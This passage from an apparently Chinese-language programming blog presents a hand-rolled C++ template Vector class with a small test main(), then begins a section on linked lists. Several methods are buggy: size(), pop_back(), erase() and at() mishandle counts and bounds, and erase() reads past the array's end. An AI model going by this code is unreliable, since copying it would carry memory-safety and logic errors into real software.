class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br><span class=\"line\">205</span><br><span class=\"line\">206</span><br><span class=\"line\">207</span><br><span class=\"line\">208</span><br><span class=\"line\">209</span><br><span class=\"line\">210</span><br><span class=\"line\">211</span><br><span class=\"line\">212</span><br><span class=\"line\">213</span><br><span class=\"line\">214</span><br><span class=\"line\">215</span><br><span class=\"line\">216</span><br><span class=\"line\">217</span><br><span class=\"line\">218</span><br><span class=\"line\">219</span><br><span class=\"line\">220</span><br><span class=\"line\">221</span><br><span class=\"line\">222</span><br><span class=\"line\">223</span><br><span class=\"line\">224</span><br><span class=\"line\">225</span><br><span class=\"line\">226</span><br><span class=\"line\">227</span><br><span class=\"line\">228</span><br><span class=\"line\">229</span><br><span class=\"line\">230</span><br><span class=\"line\">231</span><br><span class=\"line\">232</span><br><span class=\"line\">233</span><br><span class=\"line\">234</span><br><span class=\"line\">235</span><br><span class=\"line\">236</span><br><span class=\"line\">237</span><br><span class=\"line\">238</span><br><span class=\"line\">239</span><br><span class=\"line\">240</span><br><span class=\"line\">241</span><br><span class=\"line\">242</span><br><span class=\"line\">243</span><br><span class=\"line\">244</span><br><span class=\"line\">245</span><br><span class=\"line\">246</span><br><span class=\"line\">247</span><br><span class=\"line\">248</span><br><span class=\"line\">249</span><br><span class=\"line\">250</span><br><span class=\"line\">251</span><br><span class=\"line\">252</span><br><span class=\"line\">253</span><br><span class=\"line\">254</span><br><span class=\"line\">255</span><br><span class=\"line\">256</span><br><span class=\"line\">257</span><br><span class=\"line\">258</span><br><span class=\"line\">259</span><br><span class=\"line\">260</span><br><span class=\"line\">261</span><br><span class=\"line\">262</span><br><span class=\"line\">263</span><br><span class=\"line\">264</span><br><span class=\"line\">265</span><br><span class=\"line\">266</span><br><span class=\"line\">267</span><br><span class=\"line\">268</span><br><span class=\"line\">269</span><br><span class=\"line\">270</span><br><span class=\"line\">271</span><br><span class=\"line\">272</span><br><span class=\"line\">273</span><br><span class=\"line\">274</span><br><span class=\"line\">275</span><br><span class=\"line\">276</span><br><span class=\"line\">277</span><br><span class=\"line\">278</span><br><span class=\"line\">279</span><br><span class=\"line\">280</span><br><span class=\"line\">281</span><br><span class=\"line\">282</span><br><span class=\"line\">283</span><br><span class=\"line\">284</span><br><span class=\"line\">285</span><br><span class=\"line\">286</span><br><span class=\"line\">287</span><br><span class=\"line\">288</span><br><span class=\"line\">289</span><br><span class=\"line\">290</span><br><span class=\"line\">291</span><br><span class=\"line\">292</span><br><span class=\"line\">293</span><br><span class=\"line\">294</span><br><span class=\"line\">295</span><br><span class=\"line\">296</span><br><span class=\"line\">297</span><br><span class=\"line\">298</span><br><span class=\"line\">299</span><br><span class=\"line\">300</span><br><span class=\"line\">301</span><br><span class=\"line\">302</span><br><span class=\"line\">303</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&quot;stdafx.h&quot;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;iostream&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;Windows.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;string.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> SUCCESS 1</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> MALLOC_ERROR -2   <span class=\"comment\">//申请内存失败</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> INDEX_ERROR -3     <span class=\"comment\">//失败的索引号</span></span></span><br><span class=\"line\"><span class=\"keyword\">using</span> <span class=\"keyword\">namespace</span> std;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">template</span>&lt;<span class=\"keyword\">class</span> <span class=\"title class_\">T</span>&gt;</span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">Vector</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\"><span class=\"keyword\">public</span>:</span><br><span class=\"line\">\t<span class=\"built_in\">Vector</span>();</span><br><span class=\"line\">\t<span class=\"built_in\">Vector</span>(DWORD dwSize);</span><br><span class=\"line\">\t~<span class=\"built_in\">Vector</span>();</span><br><span class=\"line\"><span class=\"keyword\">public</span>:</span><br><span class=\"line\">\t<span class=\"function\">DWORD <span class=\"title\">at</span><span class=\"params\">(DWORD dwIndex, OUT T * pEle)</span></span>;   <span class=\"comment\">//根据给定的元素得到索引</span></span><br><span class=\"line\">\t<span class=\"function\">DWORD <span class=\"title\">push_back</span><span class=\"params\">(T Element)</span></span>;    <span class=\"comment\">//将元素存储到容器最后一个位置</span></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">pop_back</span><span class=\"params\">()</span></span>;   <span class=\"comment\">//删除最后一个元素</span></span><br><span class=\"line\">\t<span class=\"function\">DWORD <span class=\"title\">insert</span><span class=\"params\">(DWORD dwIndex, T Element)</span></span>;  <span class=\"comment\">//向指定位置新增一个元素</span></span><br><span class=\"line\">\t<span class=\"function\">DWORD <span class=\"title\">capacity</span><span class=\"params\">()</span></span>;  <span class=\"comment\">//返回在不增容的情况下还能存储多少元素</span></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">clear</span><span class=\"params\">()</span></span>;     <span class=\"comment\">//清空所有元素</span></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"type\">bool</span> <span class=\"title\">empty</span><span class=\"params\">()</span></span>;    <span class=\"comment\">//判断vector是否为空，返回true时为空</span></span><br><span class=\"line\">\t<span class=\"function\">DWORD <span class=\"title\">erase</span><span class=\"params\">(DWORD dwIndex)</span></span>;  <span class=\"comment\">//删除指定元素</span></span><br><span class=\"line\">\t<span class=\"function\">DWORD <span class=\"title\">size</span><span class=\"params\">()</span></span>;  <span class=\"comment\">//返回vector元素数量大小</span></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">print</span><span class=\"params\">()</span></span>;   <span class=\"comment\">//打印</span></span><br><span class=\"line\"><span class=\"keyword\">private</span>:</span><br><span class=\"line\">\t<span class=\"function\"><span class=\"type\">bool</span> <span class=\"title\">expand</span><span class=\"params\">()</span></span>;</span><br><span class=\"line\"><span class=\"keyword\">private</span>:</span><br><span class=\"line\">\tDWORD m_dwIndex;  <span class=\"comment\">//下一个可用索引</span></span><br><span class=\"line\">\tDWORD m_dwIncrement; <span class=\"comment\">//每次新增容大小</span></span><br><span class=\"line\">\tDWORD m_dwLen;   <span class=\"comment\">//当前容器长度</span></span><br><span class=\"line\">\tDWORD m_dwInitSize;  <span class=\"comment\">//默认初始化大小</span></span><br><span class=\"line\">\tT *m_pVector;  <span class=\"comment\">//容器指针</span></span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">template</span>&lt;<span class=\"keyword\">class</span> <span class=\"title class_\">T</span>&gt;</span><br><span class=\"line\">Vector&lt;T&gt;::<span class=\"built_in\">Vector</span>():<span class=\"built_in\">m_dwInitSize</span>(<span class=\"number\">100</span>),<span class=\"built_in\">m_dwIncrement</span>(<span class=\"number\">5</span>)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"comment\">//int* i = new int[5];</span></span><br><span class=\"line\">\t<span class=\"comment\">//创建长度为m_dwInitSize个T对象</span></span><br><span class=\"line\">\tm_pVector = <span class=\"keyword\">new</span> T[m_dwInitSize];</span><br><span class=\"line\">\t<span class=\"comment\">//初始化</span></span><br><span class=\"line\">\t<span class=\"built_in\">memset</span>(m_pVector, <span class=\"number\">0</span>, m_dwInitSize * <span class=\"built_in\">sizeof</span>(T));</span><br><span class=\"line\">\t<span class=\"comment\">//设置其他值</span></span><br><span class=\"line\">\tm_dwIndex = <span class=\"number\">0</span>;</span><br><span class=\"line\">\tm_dwLen = m_dwInitSize;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">template</span>&lt;<span class=\"keyword\">class</span> <span class=\"title class_\">T</span>&gt;</span><br><span class=\"line\">Vector&lt;T&gt;::<span class=\"built_in\">Vector</span>(DWORD dwSize)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"comment\">//创建长度为dwSize个T对象</span></span><br><span class=\"line\">\tm_pVector = <span class=\"keyword\">new</span> T[dwSize];</span><br><span class=\"line\">\t<span class=\"comment\">//初始化</span></span><br><span class=\"line\">\t<span class=\"built_in\">memset</span>(m_pVector, <span class=\"number\">0</span>, dwSize * <span class=\"built_in\">sizeof</span>(T));</span><br><span class=\"line\">\t<span class=\"comment\">//设置其他值</span></span><br><span class=\"line\">\tm_dwIndex = <span class=\"number\">0</span>;</span><br><span class=\"line\">\tm_dwLen = dwSize;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">template</span>&lt;<span class=\"keyword\">class</span> <span class=\"title class_\">T</span>&gt;</span><br><span class=\"line\">Vector&lt;T&gt;::~<span class=\"built_in\">Vector</span>()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">delete</span>[] m_pVector;</span><br><span class=\"line\">\tm_pVector = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">template</span>&lt;<span class=\"keyword\">class</span> <span class=\"title class_\">T</span>&gt;</span><br><span class=\"line\">DWORD Vector&lt;T&gt;::<span class=\"built_in\">at</span>(DWORD dwIndex, OUT T* pEle)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"comment\">//判断索引是否越界</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (dwIndex &lt; <span class=\"number\">0</span> || dwIndex &gt; m_dwIndex)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> INDEX_ERROR;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"comment\">//复制到pEle中</span></span><br><span class=\"line\">\t<span class=\"built_in\">memcpy</span>(pEle, &amp;m_pVector[dwIndex], <span class=\"built_in\">sizeof</span>(T));</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> SUCCESS;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">template</span>&lt;<span class=\"keyword\">class</span> <span class=\"title class_\">T</span>&gt;</span><br><span class=\"line\">DWORD Vector&lt;T&gt;::<span class=\"built_in\">push_back</span>(T Element)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"comment\">//判断是否需要增容</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (m_dwIndex &gt;= m_dwLen)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">expand</span>();</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"comment\">//复制到最后一个位置</span></span><br><span class=\"line\">\t<span class=\"built_in\">memcpy</span>(&amp;m_pVector[m_dwIndex], &amp;Element, <span class=\"built_in\">sizeof</span>(T));</span><br><span class=\"line\">\tm_dwIndex++;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> SUCCESS;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">template</span>&lt;<span class=\"keyword\">class</span> <span class=\"title class_\">T</span>&gt;</span><br><span class=\"line\"><span class=\"type\">void</span> Vector&lt;T&gt;::<span class=\"built_in\">pop_back</span>()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"built_in\">memset</span>(&amp;m_pVector[m_dwLen - <span class=\"number\">1</span>], <span class=\"number\">0</span>, <span class=\"built_in\">sizeof</span>(T));</span><br><span class=\"line\">\tm_dwIndex--;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">template</span>&lt;<span class=\"keyword\">class</span> <span class=\"title class_\">T</span>&gt;</span><br><span class=\"line\">DWORD Vector&lt;T&gt;::<span class=\"built_in\">insert</span>(DWORD dwIndex, T Element)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"comment\">//判断合理区间</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (dwIndex&lt;<span class=\"number\">0</span> || dwIndex&gt;m_dwIndex)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> INDEX_ERROR;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"comment\">//判断是否需要增容，如果需要就调用增容的函数\t\t\t\t\t\t\t\t\t\t</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (m_dwIndex &gt;= m_dwLen)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">expand</span>();</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">//后移</span></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"type\">size_t</span> i = m_dwIndex; i &gt; dwIndex; i--)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">memcpy</span>(&amp;m_pVector[i], &amp;m_pVector[i<span class=\"number\">-1</span>], <span class=\"built_in\">sizeof</span>(T));</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">//复制</span></span><br><span class=\"line\">\t<span class=\"built_in\">memcpy</span>(&amp;m_pVector[dwIndex], &amp;Element, <span class=\"built_in\">sizeof</span>(T));</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">//修改其他值</span></span><br><span class=\"line\">\tm_dwIndex++;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> SUCCESS;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">template</span>&lt;<span class=\"keyword\">class</span> <span class=\"title class_\">T</span>&gt;</span><br><span class=\"line\">DWORD Vector&lt;T&gt;::<span class=\"built_in\">capacity</span>()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> m_dwLen - m_dwIndex;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">template</span>&lt;<span class=\"keyword\">class</span> <span class=\"title class_\">T</span>&gt;</span><br><span class=\"line\"><span class=\"type\">void</span> Vector&lt;T&gt;::<span class=\"built_in\">clear</span>()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"built_in\">memset</span>(m_pVector, <span class=\"number\">0</span>, <span class=\"built_in\">sizeof</span>(T) * m_dwLen);</span><br><span class=\"line\">\tm_dwIndex = <span class=\"number\">0</span>;</span><br><span class=\"line\">\tm_dwLen = <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">template</span>&lt;<span class=\"keyword\">class</span> <span class=\"title class_\">T</span>&gt;</span><br><span class=\"line\"><span class=\"type\">bool</span> Vector&lt;T&gt;::<span class=\"built_in\">empty</span>()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (m_dwLen == <span class=\"number\">0</span> &amp; m_dwIndex == <span class=\"number\">0</span>)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">template</span>&lt;<span class=\"keyword\">class</span> <span class=\"title class_\">T</span>&gt;</span><br><span class=\"line\">DWORD Vector&lt;T&gt;::<span class=\"built_in\">erase</span>(DWORD dwIndex)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (dwIndex &gt; m_dwIndex &amp;&amp; dwIndex &lt; <span class=\"number\">0</span>)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> INDEX_ERROR;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"type\">size_t</span> i = dwIndex; i &lt; m_dwLen; i++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">memcpy</span>(&amp;m_pVector[i], &amp;m_pVector[i + <span class=\"number\">1</span>], <span class=\"built_in\">sizeof</span>(T));</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tm_dwIndex--;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> SUCCESS;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">template</span>&lt;<span class=\"keyword\">class</span> <span class=\"title class_\">T</span>&gt;</span><br><span class=\"line\">DWORD Vector&lt;T&gt;::<span class=\"built_in\">size</span>()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> m_dwLen;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">template</span>&lt;<span class=\"keyword\">class</span> <span class=\"title class_\">T</span>&gt;</span><br><span class=\"line\"><span class=\"type\">void</span> Vector&lt;T&gt;::<span class=\"built_in\">print</span>()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"type\">int</span> i = <span class=\"number\">0</span>; i &lt; m_dwLen; i++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tcout &lt;&lt; m_pVector[i] &lt;&lt; <span class=\"string\">&quot;\\n&quot;</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">template</span>&lt;<span class=\"keyword\">class</span> <span class=\"title class_\">T</span>&gt;</span><br><span class=\"line\"><span class=\"type\">bool</span> Vector&lt;T&gt;::<span class=\"built_in\">expand</span>()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">\tT* newPointer = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\t<span class=\"comment\">//计算增加后的长度</span></span><br><span class=\"line\">\tDWORD newLen = m_dwIncrement + m_dwLen;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">//申请空间</span></span><br><span class=\"line\">\tnewPointer = <span class=\"keyword\">new</span> T[newLen];</span><br><span class=\"line\">\t<span class=\"built_in\">memset</span>(newPointer, <span class=\"number\">0</span>, <span class=\"built_in\">sizeof</span>(T)*newLen);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">//数据复制到新空间</span></span><br><span class=\"line\">\t<span class=\"built_in\">memcpy</span>(newPointer, m_pVector, <span class=\"built_in\">sizeof</span>(T)*m_dwLen);</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">//释放原来空间</span></span><br><span class=\"line\">\t<span class=\"keyword\">delete</span>[] m_pVector;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">//属性赋值</span></span><br><span class=\"line\">\tm_pVector = newPointer;</span><br><span class=\"line\">\tnewPointer = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\tm_dwLen = newLen;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> SUCCESS;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">if</span> 0</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (m_dwIndex &gt;= m_dwLen) </span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"comment\">//创建一个新容器</span></span><br><span class=\"line\">\t\tT* p = <span class=\"keyword\">new</span> T[m_dwLen + m_dwIncrement];</span><br><span class=\"line\">\t\t<span class=\"comment\">//复制原来容器元素到新容器</span></span><br><span class=\"line\">\t\t<span class=\"built_in\">memcpy</span>(p, m_pVector, <span class=\"built_in\">sizeof</span>(T)*m_dwLen);</span><br><span class=\"line\">\t\t<span class=\"comment\">//删除原数据</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">delete</span>[] m_pVector;</span><br><span class=\"line\">\t\tm_pVector = p;</span><br><span class=\"line\">\t\tm_dwLen = m_dwLen + m_dwIncrement;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">else</span></span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;当前容量充足&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">char</span>* argv[])</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"function\">Vector&lt;<span class=\"type\">int</span>&gt; <span class=\"title\">haha</span><span class=\"params\">(<span class=\"number\">5</span>)</span></span>;</span><br><span class=\"line\">\t<span class=\"comment\">//for (size_t i = 0; i &lt; haha.size(); i++)</span></span><br><span class=\"line\">\t<span class=\"comment\">//&#123;</span></span><br><span class=\"line\">\t<span class=\"comment\">//\thaha.insert(i, i);</span></span><br><span class=\"line\">\t<span class=\"comment\">//&#125;</span></span><br><span class=\"line\">\t<span class=\"comment\">//haha.print();</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">//int p = 0;</span></span><br><span class=\"line\">\t<span class=\"comment\">//haha.at(50, &amp;p);</span></span><br><span class=\"line\">\t<span class=\"comment\">//cout &lt;&lt; p &lt;&lt; &quot;\\n&quot;;</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">//cout &lt;&lt;haha.capacity() &lt;&lt; &quot;\\n&quot;;</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">//haha.erase(90);</span></span><br><span class=\"line\">\t<span class=\"comment\">//haha.erase(91);</span></span><br><span class=\"line\">\t<span class=\"comment\">//cout &lt;&lt; haha.capacity() &lt;&lt; &quot;\\n&quot;;</span></span><br><span class=\"line\">\t<span class=\"comment\">//haha.print();</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">//if (haha.empty() == 1)</span></span><br><span class=\"line\">\t<span class=\"comment\">//&#123;</span></span><br><span class=\"line\">\t<span class=\"comment\">//\tcout &lt;&lt; &quot;empty!\\n&quot;;</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">//&#125;</span></span><br><span class=\"line\">\t<span class=\"comment\">//else</span></span><br><span class=\"line\">\t<span class=\"comment\">//&#123;</span></span><br><span class=\"line\">\t<span class=\"comment\">//\tcout &lt;&lt; &quot;not empty\\n&quot;;</span></span><br><span class=\"line\">\t<span class=\"comment\">//&#125;</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">//haha.clear();</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">//if (haha.empty() == 1)</span></span><br><span class=\"line\">\t<span class=\"comment\">//&#123;</span></span><br><span class=\"line\">\t<span class=\"comment\">//\tcout &lt;&lt; &quot;empty!\\n&quot;;</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">//&#125;</span></span><br><span class=\"line\">\t<span class=\"comment\">//else</span></span><br><span class=\"line\">\t<span class=\"comment\">//&#123;</span></span><br><span class=\"line\">\t<span class=\"comment\">//\tcout &lt;&lt; &quot;not empty\\n&quot;;</span></span><br><span class=\"line\">\t<span class=\"comment\">//&#125;</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">//haha.clear();</span></span><br><span class=\"line\">\thaha.<span class=\"built_in\">push_back</span>(<span class=\"number\">5</span>);</span><br><span class=\"line\">\thaha.<span class=\"built_in\">push_back</span>(<span class=\"number\">4</span>);</span><br><span class=\"line\">\thaha.<span class=\"built_in\">push_back</span>(<span class=\"number\">3</span>);</span><br><span class=\"line\">\thaha.<span class=\"built_in\">push_back</span>(<span class=\"number\">2</span>);</span><br><span class=\"line\">\thaha.<span class=\"built_in\">push_back</span>(<span class=\"number\">1</span>);</span><br><span class=\"line\">\t<span class=\"comment\">//haha.print();</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">//haha.print();</span></span><br><span class=\"line\">\t<span class=\"comment\">//haha.pop_back();</span></span><br><span class=\"line\">\t<span class=\"comment\">//haha.print();</span></span><br><span class=\"line\"></span><br><span class=\"line\">\tcout &lt;&lt; haha.<span class=\"built_in\">size</span>() &lt;&lt; <span class=\"string\">&quot;\\n\\n&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\thaha.<span class=\"built_in\">insert</span>(<span class=\"number\">1</span>, <span class=\"number\">100</span>);</span><br><span class=\"line\">\tcout &lt;&lt; haha.<span class=\"built_in\">size</span>() &lt;&lt; <span class=\"string\">&quot;\\n\\n&quot;</span>;</span><br><span class=\"line\">\thaha.<span class=\"built_in\">print</span>();</span><br><span class=\"line\"></span><br><span class=\"line\">\tstd::cout &lt;&lt; <span class=\"string\">&quot;Hello World!\\n&quot;</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h3 id=\"链表\"><a class=\"markdownIt-Anchor\" href=\"#链表\">#</a> 链表</h3>\n<p>1、数据分散存储</p>\n<p>2、查询性能没有 Vector 好</p>\n<p>3、新增与删除的性能好于 Vector</p>\n<p>单链表，循环链表，双向链表</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span 